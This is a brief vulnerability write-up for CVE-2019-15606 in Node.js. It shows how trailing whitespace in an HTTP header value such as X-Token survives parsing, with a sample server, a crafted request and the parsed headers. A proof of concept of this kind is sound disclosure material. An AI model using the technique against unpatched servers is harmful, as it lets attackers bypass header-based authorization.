# CVE-2019-15606

Including trailing white space in HTTP header values in Nodejs 10, 12, and 13 causes bypass of authorization based on header value comparisons.

## Affected Versions

Node.js before version v10.19.0, v12.15.0, v13.8.0.

## PoC

```js
const http = require('http');
const net = require('net');

const server = http.createServer();

server.on('request', function(req, res) {
  console.log(req.headers);
  res.writeHead(200, {'Content-Type' : 'text/plain'});
  res.write('hello world');
  res.end();
});

server.listen(12345);
```

```
GET / HTTP/1.1
Host: localhost:12345
User-Agent: curl/7.54.0
Accept: */*
X-Token: 123456  
Connection: close
```

```json
{
  host: 'localhost:12345',
  'user-agent': 'curl/7.54.0',
  accept: '*/*',
  'x-token': '123456\t ', # not striped OWS
  connection: 'close'
}
```

## References

- https://nvd.nist.gov/vuln/detail/CVE-2019-15606
- https://nodejs.org/en/blog/vulnerability/february-2020-security-releases/
- https://github.com/nodejs/node/commit/2eee90e959
